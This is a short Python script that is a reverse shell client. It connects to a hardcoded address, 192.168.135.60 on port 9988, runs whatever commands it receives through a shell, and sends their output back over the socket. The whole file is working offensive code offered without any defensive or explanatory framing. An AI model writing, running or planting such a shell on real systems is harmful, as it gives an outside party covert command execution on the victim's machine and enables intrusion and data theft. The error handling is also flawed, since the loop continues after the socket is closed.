import subprocess
import socket
import os

HOST = "192.168.135.60"
PORT = 9988

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
active = True

while True:
    try:
        command = client.recv(4096).decode('ascii')
        if command[:2] == "cd" and len(command) > 3:
            os.chdir(command[3:])

        task = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        stdout,stderr = task.communicate()
        data = stdout.decode() + stderr.decode() #gives the error
        client.send(data.encode('ascii'))

    except:
        client.close()
        active = False